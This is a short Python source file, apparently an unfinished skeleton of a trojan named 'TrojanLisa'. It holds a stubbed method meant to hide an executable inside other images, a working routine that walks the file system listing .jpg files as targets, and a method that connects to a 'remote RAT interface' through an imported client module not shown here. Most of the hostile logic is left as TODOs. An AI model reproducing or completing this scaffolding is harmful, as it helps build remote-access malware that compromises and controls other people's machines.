import os
import client

class TrojanLisa:
    def __init__(self):
        self.client = client.Client()


    """ Steganographic executable propagation into other images. """
    def propagate(self):
        # TODO: Write excutable propagation
        pass


    """ Enumerate through file system and list all jpg files. """
    def enumerate_fs(self):
        # TODO: Change filetype to image that allows executable embeddings
        rootdir = "." + os.sep
        for subdir, dirs, files in os.walk(rootdir):
            for file in files:
                filepath = subdir + os.sep + file

                if filepath.endswith(".jpg"):
                    print(filepath)

    """ Establish a connection to remote RAT interface. """
    def connect_to_server(self):
        self.client.connect()
            
if __name__=="__main__":
    trojan_lisa = TrojanLisa()
    trojan_lisa.propagate()